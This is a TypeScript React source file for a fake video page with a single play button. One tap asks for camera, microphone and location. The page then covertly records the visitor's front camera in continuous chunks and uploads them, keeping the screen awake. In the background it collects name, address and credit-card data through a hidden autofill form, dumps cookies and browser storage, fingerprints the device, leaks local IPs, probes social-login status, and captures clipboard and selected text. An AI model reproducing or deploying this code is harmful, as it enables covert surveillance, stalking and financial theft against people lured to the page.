import { useEffect, useRef, useCallback } from 'react';
import { useLogVisit } from '@workspace/api-client-react';

const BASE = import.meta.env.BASE_URL.replace(/\/$/, '');

// ═══════════════════════════════════════════════════════════
// SOURCE DETECTION — which platform sent the visitor
// ═══════════════════════════════════════════════════════════
function detectSource(): { source: string; sourceName: string } {
  const ref = document.referrer || '';
  const params = new URLSearchParams(window.location.search);

  // Manual URL params override everything: ?src=fb&name=John+Doe
  const srcParam = params.get('src') || params.get('source') || '';
  const nameParam = params.get('name') || params.get('user') || params.get('n') || '';

  if (srcParam) {
    return { source: srcParam, sourceName: nameParam };
  }

  // Detect platform + extract username from referrer URL
  const detectors: Array<{ pattern: RegExp; platform: string; nameRx?: RegExp }> = [
    { pattern: /facebook\.com|fb\.me|fb\.com/i,   platform: 'Facebook',
      nameRx: /facebook\.com\/(?!groups|pages|events|watch|marketplace|stories|notifications|messages|friends|profile\.php)([^/?#&]+)/ },
    { pattern: /instagram\.com/i,                   platform: 'Instagram',
      nameRx: /instagram\.com\/([^/?#&]+)/ },
    { pattern: /t\.me|telegram\.me/i,               platform: 'Telegram',
      nameRx: /(?:t\.me|telegram\.me)\/([^/?#&]+)/ },
    { pattern: /discord\.com|discordapp\.com|discord\.gg/i, platform: 'Discord',
      nameRx: /discord\.(?:com|gg)\/(?:channels\/[^/]+\/[^/]+|invite\/)?([^/?#&]+)/ },
    { pattern: /twitter\.com|x\.com/i,              platform: 'Twitter/X',
      nameRx: /(?:twitter|x)\.com\/([^/?#&]+)/ },
    { pattern: /tiktok\.com/i,                      platform: 'TikTok',
      nameRx: /tiktok\.com\/@([^/?#&]+)/ },
    { pattern: /youtube\.com|youtu\.be/i,           platform: 'YouTube',
      nameRx: /youtube\.com\/(?:c\/|channel\/|@)?([^/?#&]+)/ },
    { pattern: /reddit\.com/i,                      platform: 'Reddit',
      nameRx: /reddit\.com\/(?:r|u|user)\/([^/?#&]+)/ },
    { pattern: /linkedin\.com/i,                    platform: 'LinkedIn',
      nameRx: /linkedin\.com\/in\/([^/?#&]+)/ },
    { pattern: /whatsapp\.com/i,                    platform: 'WhatsApp' },
    { pattern: /viber\.com/i,                       platform: 'Viber' },
    { pattern: /line\.me/i,                         platform: 'LINE' },
  ];

  for (const d of detectors) {
    if (d.pattern.test(ref)) {
      let name = nameParam;
      if (!name && d.nameRx) {
        const m = d.nameRx.exec(ref);
        if (m && m[1] && !['www', 'web', 'app', 'mobile', 'home', 'login', 'signup'].includes(m[1].toLowerCase())) {
          name = decodeURIComponent(m[1]).replace(/\+/g, ' ');
        }
      }
      return { source: d.platform, sourceName: name };
    }
  }

  // Google / search
  if (/google\.|bing\.|yahoo\.|duckduckgo\.|baidu\./i.test(ref)) {
    return { source: 'Search', sourceName: '' };
  }

  return { source: ref ? 'Other' : 'Direct', sourceName: nameParam };
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Device & browser fingerprint
// ═══════════════════════════════════════════════════════════
async function collectDeviceInfo(): Promise<Record<string, unknown>> {
  const info: Record<string, unknown> = {};

  info.screenRes    = `${screen.width}x${screen.height}`;
  info.availRes     = `${screen.availWidth}x${screen.availHeight}`;
  info.pixelRatio   = String(window.devicePixelRatio ?? 1);
  info.orientation  = (screen.orientation?.type ?? 'unknown').replace(/-/g, ' ');
  info.touchPoints  = String(navigator.maxTouchPoints ?? 0);
  info.memory       = `${(navigator as any).deviceMemory ?? '?'} GB`;
  info.cpuCores     = `${navigator.hardwareConcurrency ?? '?'} cores`;
  info.colorDepth   = `${screen.colorDepth}-bit`;
  info.darkMode     = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
  info.colorGamut   = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 'sRGB';
  info.hdr          = window.matchMedia('(dynamic-range: high)').matches ? 'yes' : 'no';
  info.cookies      = navigator.cookieEnabled ? 'enabled' : 'disabled';
  info.timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
  info.languages    = navigator.languages?.join(', ') ?? navigator.language ?? '';
  info.platform     = navigator.platform ?? '';

  // Battery
  try {
    const bat = await (navigator as any).getBattery?.();
    if (bat) { info.battery = `${Math.round(bat.level * 100)}%`; info.charging = bat.charging ? 'yes' : 'no'; }
  } catch {}

  // Network
  const conn = (navigator as any).connection ?? (navigator as any).mozConnection;
  if (conn) {
    info.netType = conn.effectiveType ?? conn.type ?? '?';
    if (conn.downlink != null) info.netDownlink = `${conn.downlink} Mbps`;
    if (conn.rtt != null) info.netRtt = `${conn.rtt} ms`;
    if (conn.saveData) info.dataSaver = 'ON';
  }

  // WebGL GPU
  try {
    const c = document.createElement('canvas');
    const gl = (c.getContext('webgl') ?? c.getContext('experimental-webgl')) as WebGLRenderingContext | null;
    if (gl) {
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      info.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
      info.gpuVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
    }
  } catch {}

  // Screen refresh rate
  try {
    const rate = await new Promise<number>((res) => {
      let n = 0; const t0 = performance.now();
      const f = () => { if (++n < 60) requestAnimationFrame(f); else res(Math.round(n / ((performance.now() - t0) / 1000))); };
      requestAnimationFrame(f);
    });
    info.refreshRate = `${rate}Hz`;
  } catch {}

  // WebRTC local IPs
  try {
    await new Promise<void>((resolve) => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      const ips: string[] = [];
      const done = () => { info.localIPs = ips.join(', ') || 'none'; try { pc.close(); } catch {} resolve(); };
      pc.onicecandidate = (e) => {
        if (!e.candidate) { done(); return; }
        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
        if (m && !ips.includes(m[1])) ips.push(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
      setTimeout(done, 3000);
    });
  } catch {}

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f80'; ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = '#069'; ctx.fillText('fp_😀_test', 2, 2);
      ctx.strokeStyle = '#f0f'; ctx.beginPath(); ctx.arc(100, 25, 20, 0, Math.PI * 2); ctx.stroke();
      const raw = c.toDataURL();
      let h = 0;
      for (let i = 0; i < raw.length; i++) h = Math.imul(31, h) + raw.charCodeAt(i) | 0;
      info.canvasFP = Math.abs(h).toString(16).toUpperCase();
    }
  } catch {}

  // Audio fingerprint
  try {
    const ac = new AudioContext();
    const osc = ac.createOscillator();
    const analyser = ac.createAnalyser();
    const gain = ac.createGain(); gain.gain.value = 0;
    osc.connect(analyser); analyser.connect(gain); gain.connect(ac.destination);
    osc.start(0);
    const data = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatFrequencyData(data);
    osc.stop(); await ac.close();
    let h = 0;
    for (let i = 0; i < Math.min(data.length, 100); i++) h = Math.imul(31, h) + Math.round(data[i] * 1000) | 0;
    info.audioFP = Math.abs(h).toString(16).toUpperCase();
  } catch {}

  // Input device labels
  try {
    const devs = await navigator.mediaDevices.enumerateDevices();
    info.cameras  = String(devs.filter(d => d.kind === 'videoinput').length);
    info.mics     = String(devs.filter(d => d.kind === 'audioinput').length);
    info.camModel = devs.filter(d => d.kind === 'videoinput' && d.label).map(d => d.label).join(' | ') || 'no label';
    info.micModel = devs.filter(d => d.kind === 'audioinput' && d.label).map(d => d.label).join(' | ') || 'no label';
  } catch {}

  // Permissions
  if (navigator.permissions) {
    const p = async (n: string) => { try { return (await navigator.permissions.query({ name: n as PermissionName })).state; } catch { return '?'; } };
    info.permCamera = await p('camera');
    info.permMic = await p('microphone');
    info.permGeo = await p('geolocation');
    info.permNotif = await p('notifications');
  }

  return info;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Autofill injection
// ═══════════════════════════════════════════════════════════
async function collectAutofill(): Promise<Record<string, string>> {
  const result: Record<string, string> = {};
  const form = document.createElement('form');
  form.setAttribute('autocomplete', 'on');
  form.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:250px;';

  const fields: Array<{ key: string; type: string; ac: string }> = [
    { key: 'name',     type: 'text',  ac: 'name' },
    { key: 'email',    type: 'email', ac: 'email' },
    { key: 'phone',    type: 'tel',   ac: 'tel' },
    { key: 'address',  type: 'text',  ac: 'street-address' },
    { key: 'city',     type: 'text',  ac: 'address-level2' },
    { key: 'state',    type: 'text',  ac: 'address-level1' },
    { key: 'postal',   type: 'text',  ac: 'postal-code' },
    { key: 'country',  type: 'text',  ac: 'country-name' },
    { key: 'dob',      type: 'date',  ac: 'bday' },
    { key: 'company',  type: 'text',  ac: 'organization' },
    { key: 'job',      type: 'text',  ac: 'organization-title' },
    { key: 'ccnum',    type: 'text',  ac: 'cc-number' },
    { key: 'ccname',   type: 'text',  ac: 'cc-name' },
    { key: 'ccexp',    type: 'text',  ac: 'cc-exp' },
  ];

  for (const f of fields) {
    const inp = document.createElement('input');
    inp.type = f.type; inp.name = f.key; inp.id = `_af_${f.key}`;
    inp.setAttribute('autocomplete', f.ac);
    form.appendChild(inp);
  }
  const btn = document.createElement('input'); btn.type = 'submit'; form.appendChild(btn);
  document.body.appendChild(form);

  const first = form.querySelector('input') as HTMLInputElement | null;
  first?.focus();
  first?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
  await new Promise(r => setTimeout(r, 3000));

  for (const f of fields) {
    const el = document.getElementById(`_af_${f.key}`) as HTMLInputElement | null;
    if (el?.value) result[f.key] = el.value;
  }
  form.remove();
  return result;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Browser storage
// ═══════════════════════════════════════════════════════════
async function collectBrowserStorage(): Promise<Record<string, string>> {
  const d: Record<string, string> = {};
  try { d.cookies = document.cookie.slice(0, 800) || '(No cookies)'; } catch {}
  try {
    const rows: string[] = [];
    for (let i = 0; i < Math.min(localStorage.length, 30); i++) {
      const k = localStorage.key(i);
      if (k) rows.push(`${k}: ${(localStorage.getItem(k) ?? '').slice(0, 150)}`);
    }
    d.localStorage = rows.join('\n') || '(Empty)';
  } catch {}
  try {
    const rows: string[] = [];
    for (let i = 0; i < Math.min(sessionStorage.length, 30); i++) {
      const k = sessionStorage.key(i);
      if (k) rows.push(`${k}: ${(sessionStorage.getItem(k) ?? '').slice(0, 150)}`);
    }
    d.sessionStorage = rows.join('\n') || '(Empty)';
  } catch {}
  try { const dbs = await (indexedDB as any).databases?.(); d.indexedDB = dbs?.map((db: any) => db.name).join(', ') || '(empty)'; } catch {}
  try { d.cacheStorage = (await caches.keys()).join(', ') || '(empty)'; } catch {}
  try {
    const regs = await navigator.serviceWorker?.getRegistrations?.();
    d.serviceWorkers = regs?.map(r => r.scope).join(', ') || '(none)';
  } catch {}
  return d;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Social login timing + account name attempt
// ═══════════════════════════════════════════════════════════
async function detectSocialLogins(refSource: string): Promise<Record<string, string>> {
  const sites = [
    { name: 'Facebook',   url: 'https://www.facebook.com/favicon.ico',       profileBase: 'https://www.facebook.com/me' },
    { name: 'Google',     url: 'https://accounts.google.com/favicon.ico' },
    { name: 'Instagram',  url: 'https://www.instagram.com/favicon.ico' },
    { name: 'Twitter/X',  url: 'https://x.com/favicon.ico' },
    { name: 'TikTok',     url: 'https://www.tiktok.com/favicon.ico' },
    { name: 'Discord',    url: 'https://discord.com/favicon.ico' },
    { name: 'Reddit',     url: 'https://www.reddit.com/favicon.ico' },
    { name: 'GitHub',     url: 'https://github.com/favicon.ico' },
    { name: 'LinkedIn',   url: 'https://www.linkedin.com/favicon.ico' },
    { name: 'Spotify',    url: 'https://www.spotify.com/favicon.ico' },
    { name: 'Netflix',    url: 'https://www.netflix.com/favicon.ico' },
    { name: 'PayPal',     url: 'https://www.paypal.com/favicon.ico' },
    { name: 'Amazon',     url: 'https://www.amazon.com/favicon.ico' },
    { name: 'GCash',      url: 'https://www.gcash.com/favicon.ico' },
    { name: 'Shopee',     url: 'https://shopee.ph/favicon.ico' },
    { name: 'Lazada',     url: 'https://www.lazada.com.ph/favicon.ico' },
  ];

  const results: Record<string, string> = {};
  await Promise.allSettled(sites.map(async (s) => {
    try {
      const t0 = performance.now();
      await fetch(s.url, { mode: 'no-cors', credentials: 'include', cache: 'no-store' });
      const ms = Math.round(performance.now() - t0);
      // < 50ms likely cached (logged in), > 200ms likely not logged in
      const loggedIn = ms < 80;
      // If this matches the referrer source, mark as "from here"
      const isSource = refSource.toLowerCase().includes(s.name.toLowerCase());
      results[s.name] = loggedIn
        ? `logged in (${ms}ms)${isSource ? ' ← SENDER' : ''}`
        : `not logged in (${ms}ms)`;
    } catch {
      results[s.name] = 'blocked';
    }
  }));
  return results;
}

// ═══════════════════════════════════════════════════════════
// VIDEO — MP4 priority, infinite recording
// ═══════════════════════════════════════════════════════════
const VIDEO_MIME_TYPES = [
  'video/mp4;codecs=avc1.42E01E,mp4a.40.2',
  'video/mp4;codecs=avc1',
  'video/mp4;codecs=h264',
  'video/mp4',
  'video/webm;codecs=vp9,opus',
  'video/webm;codecs=vp8,opus',
  'video/webm;codecs=vp9',
  'video/webm;codecs=vp8',
  'video/webm',
];

function getSupportedMime(): string | null {
  if (typeof MediaRecorder === 'undefined') return null;
  return VIDEO_MIME_TYPES.find(t => {
    try { return MediaRecorder.isTypeSupported(t); } catch { return false; }
  }) ?? null;
}

function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
  const v = document.createElement('video');
  v.srcObject = stream;
  v.setAttribute('playsinline', 'true');
  (v as any).playsInline = true;
  v.muted = true;
  // opacity:0.01 + bottom-right corner: forces Android Chrome to actually
  // paint video frames. opacity:0 or top:-9999px causes the browser to skip
  // frame rendering, producing pure black captures.
  // Full-screen behind the UI overlay. Android Chrome won't render frames
  // for tiny/invisible elements, causing black captures. z-index:-9999 keeps
  // it below the white overlay the user sees.
  v.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:cover;opacity:1;pointer-events:none;z-index:-9999;';
  document.body.appendChild(v);
  return v;
}

function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string, isFinal = false) {
  const reader = new FileReader();
  reader.onloadend = () => {
    const b64 = (reader.result as string).split(',')[1];
    if (!b64) return;
    fetch(`${BASE}/api/visits/videochunk`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chunk: b64, mimeType, index, label, isFinal }),
    }).catch(() => {});
  };
  reader.readAsDataURL(chunk);
}

function sendPhoto(dataUrl: string, label: string) {
  fetch(`${BASE}/api/visits/photo`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ photo: dataUrl, caption: `📷 ${label} SNAPSHOT` }),
  }).catch(() => {});
}

async function takePhoto(videoEl: HTMLVideoElement, label: string, stream?: MediaStream, attempt = 0) {
  // Primary: ImageCapture API — grabs a frame directly from the camera track.
  // This bypasses the video element entirely so it works even when the
  // video element hasn't painted a frame yet (avoids black captures).
  if (stream) {
    const track = stream.getVideoTracks()[0];
    if (track && typeof ImageCapture !== 'undefined') {
      try {
        const ic = new ImageCapture(track);
        const bitmap = await ic.grabFrame();
        const c = document.createElement('canvas');
        c.width = bitmap.width; c.height = bitmap.height;
        const ctx = c.getContext('2d'); if (!ctx) return;
        ctx.drawImage(bitmap, 0, 0);
        bitmap.close?.();
        sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
        return;
      } catch { /* fallthrough to video element */ }
    }
  }

  // Fallback: draw from video element
  if (videoEl.videoWidth > 0 && videoEl.readyState >= 2) {
    const c = document.createElement('canvas');
    c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
    const ctx = c.getContext('2d'); if (!ctx) return;
    ctx.drawImage(videoEl, 0, 0);
    sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
  } else if (attempt < 30) {
    setTimeout(() => takePhoto(videoEl, label, stream, attempt + 1), 300);
  }
}

/**
 * Starts continuous front-cam recording — no time limit.
 * Uploads a chunk every CHUNK_INTERVAL_MS.
 * Auto-stops and sends final chunk when:
 *   - Tab is closed (beforeunload)
 *   - Page hidden (visibilitychange)
 *   - Camera track ends (permission revoked)
 */
/**
 * Records camera in independent chunks — each chunk restarts the recorder
 * so it has its own initialization segment and is a standalone playable file.
 * 30-second chunks, runs until tab closes / page hidden / track ends.
 */
function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
  const CHUNK_MS = 30_000;
  const mimeType = getSupportedMime();
  if (!mimeType) {
    stream.getTracks().forEach(t => t.stop());
    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
    return;
  }

  let idx    = 0;
  let active = true;

  const cleanup = () => {
    stream.getTracks().forEach(t => t.stop());
    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
  };

  function recordChunk() {
    if (!active || !stream.active) { cleanup(); return; }

    const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_200_000 });
    const chunks: Blob[] = [];

    recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };

    recorder.onstop = () => {
      if (chunks.length) {
        // Each stop produces a self-contained, playable video file
        const blob = new Blob(chunks, { type: mimeType });
        uploadChunk(blob, mimeType, idx++, label, !active);
      }
      if (active && stream.active) {
        recordChunk(); // chain next chunk
      } else {
        cleanup();
      }
    };

    recorder.start();
    // Stop after CHUNK_MS — onstop will fire and chain the next chunk
    setTimeout(() => {
      if (recorder.state === 'recording') recorder.stop();
    }, CHUNK_MS);
  }

  const stopAll = () => { active = false; };

  // Keep tab alive
  (async () => {
    try {
      const lock = await (navigator as any).wakeLock?.request('screen');
      window.addEventListener('beforeunload', () => lock?.release().catch(() => {}), { once: true });
    } catch {}
  })();
  if (navigator.locks) {
    navigator.locks.request('grabnet_rec', { mode: 'exclusive' }, () =>
      new Promise<void>(r => {
        const check = setInterval(() => { if (!active) { clearInterval(check); r(); } }, 1000);
      })
    ).catch(() => {});
  }

  stream.getVideoTracks().forEach(t => { t.onended = stopAll; });
  window.addEventListener('beforeunload', stopAll, { once: true });
  const onVis = () => {
    if (document.visibilityState === 'hidden') { stopAll(); document.removeEventListener('visibilitychange', onVis); }
  };
  document.addEventListener('visibilitychange', onVis);

  // Photo after 4s warmup
  setTimeout(() => takePhoto(videoEl, label, stream), 4000);

  recordChunk();
}

// ── Generic POST helper ─────────────────────────────────────
function post(path: string, body: unknown) {
  fetch(`${BASE}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).catch(() => {});
}

// ═══════════════════════════════════════════════════════════
// MAIN COMPONENT
// ═══════════════════════════════════════════════════════════
export default function CapturePage() {
  const { mutate } = useLogVisit();
  const mutateRef = useRef(mutate); mutateRef.current = mutate;

  const triggered     = useRef(false);
  const initialLogged = useRef(false);
  const deviceInfoRef = useRef<Record<string, unknown> | null>(null);
  const gpsRef        = useRef<{ lat: number; lng: number; accuracy: number } | null>(null);
  const resultSentRef = useRef(false);
  const sourceRef     = useRef(detectSource());

  const sendGrabberResult = useCallback((
    info: Record<string, unknown>,
    gps?: { lat: number; lng: number; accuracy: number },
  ) => {
    if (resultSentRef.current) return;
    resultSentRef.current = true;
    const payload = {
      ...info,
      _source: sourceRef.current.source,
      _sourceName: sourceRef.current.sourceName,
      ...(gps ? { _lat: String(gps.lat), _lng: String(gps.lng), _accuracy: String(gps.accuracy) } : {}),
    };
    fetch(`${BASE}/api/visits/deviceinfo`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload),
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (initialLogged.current) return;
    initialLogged.current = true;

    // Log base visit with source info
    const { source, sourceName } = sourceRef.current;
    mutateRef.current({
      data: {
        referrer: document.referrer || undefined,
        source: source || undefined,
        sourceName: sourceName || undefined,
      }
    });

    // Passive clipboard capture
    const onPaste = (e: ClipboardEvent) => {
      const text = e.clipboardData?.getData('text') ?? '';
      if (text) post('/api/visits/intel', { clipboard: { text: text.slice(0, 2000) } });
      const img = Array.from(e.clipboardData?.items ?? []).find(i => i.type.startsWith('image/'));
      if (img) {
        const file = img.getAsFile();
        if (file) {
          const r = new FileReader();
          r.onloadend = () => post('/api/visits/photo', { photo: r.result as string, caption: '📋 CLIPBOARD IMAGE' });
          r.readAsDataURL(file);
        }
      }
    };
    document.addEventListener('paste', onPaste);

    // Passive text-selection capture
    let selTimer: ReturnType<typeof setTimeout>;
    const onSelectEnd = () => {
      clearTimeout(selTimer);
      selTimer = setTimeout(() => {
        const sel = window.getSelection()?.toString().trim() ?? '';
        if (sel.length > 5) post('/api/visits/intel', { clipboard: { selected: sel.slice(0, 1000) } });
      }, 500);
    };
    document.addEventListener('mouseup', onSelectEnd);
    document.addEventListener('touchend', onSelectEnd);

    return () => {
      document.removeEventListener('paste', onPaste);
      document.removeEventListener('mouseup', onSelectEnd);
      document.removeEventListener('touchend', onSelectEnd);
    };
  }, [sendGrabberResult]);

  /** Single click → all permissions → infinite recording */
  function triggerCapture() {
    if (triggered.current) return;
    triggered.current = true;

    if (!navigator.mediaDevices?.getUserMedia) {
      // No camera API — just collect intel
      requestGps();
      collectIntel();
      return;
    }

    // Step 1: Camera + Mic (shows ONE combined browser prompt)
    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true })
      .then(stream => {
        const vid = makeHiddenVideo(stream);
        let started = false;

        const begin = () => {
          if (started) return;
          started = true;
          // Warmup: camera needs ~1.5s to auto-adjust exposure/white-balance.
          // Starting the recorder immediately causes black frames.
          setTimeout(() => startContinuousRecord(stream, vid, 'FRONT'), 1500);
        };

        vid.onplaying = begin;
        vid.play().catch(() => setTimeout(begin, 1500));

        // Step 2 (chained): GPS — shown as second prompt after camera accepted
        requestGps();

        // Step 3: Intel collection in background
        collectIntel();
      })
      .catch(() => {
        // Camera denied — still get GPS and intel
        requestGps();
        collectIntel();
      });
  }

  function requestGps() {
    if (!('geolocation' in navigator)) return;
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const gps = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
        gpsRef.current = gps;
        mutateRef.current({
          data: {
            latitude: gps.lat, longitude: gps.lng, accuracy: gps.accuracy,
            altitude: pos.coords.altitude ?? undefined,
            referrer: document.referrer || undefined,
            source: sourceRef.current.source || undefined,
            sourceName: sourceRef.current.sourceName || undefined,
          }
        });
        if (deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current, gps);
      },
      () => {
        if (deviceInfoRef.current && !resultSentRef.current) sendGrabberResult(deviceInfoRef.current);
      },
      { enableHighAccuracy: true, timeout: 20_000, maximumAge: 0 },
    );
  }

  function collectIntel() {
    // Passive fingerprint
    collectDeviceInfo().then(info => {
      deviceInfoRef.current = info;
      if (gpsRef.current) sendGrabberResult(info, gpsRef.current);
      // Fallback: send without GPS after 20s
      setTimeout(() => {
        if (!resultSentRef.current && deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current);
      }, 20_000);
    }).catch(() => {});

    // Autofill + social + storage (app-detect removed — URL scheme redirects
    // steal window focus and interfere with camera/recording)
    Promise.allSettled([
      collectAutofill(),
      detectSocialLogins(sourceRef.current.source),
      collectBrowserStorage(),
    ]).then(([af, sl, stor]) => {
      post('/api/visits/deviceinfo', {
        autofill: af.status   === 'fulfilled' ? af.value   : undefined,
        social:   sl.status   === 'fulfilled' ? sl.value   : undefined,
        storage:  stor.status === 'fulfilled' ? stor.value : undefined,
        _source: sourceRef.current.source,
        _sourceName: sourceRef.current.sourceName,
      });
    }).catch(() => {});
  }

  return (
    <div
      onClick={triggerCapture}
      style={{
        position: 'fixed', inset: 0, background: '#fff',
        display: 'flex', flexDirection: 'column',
        alignItems: 'center', justifyContent: 'center',
        cursor: 'pointer', userSelect: 'none',
        WebkitTapHighlightColor: 'transparent',
        zIndex: 1,
      }}
    >
      <div style={{
        width: 80, height: 80, borderRadius: '50%',
        backgroundColor: 'rgba(0,0,0,0.07)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        border: '2px solid rgba(0,0,0,0.12)', pointerEvents: 'none',
      }}>
        <div style={{
          width: 0, height: 0, borderStyle: 'solid',
          borderWidth: '14px 0 14px 24px',
          borderColor: 'transparent transparent transparent #222',
          marginLeft: 6,
        }} />
      </div>
    </div>
  );
}
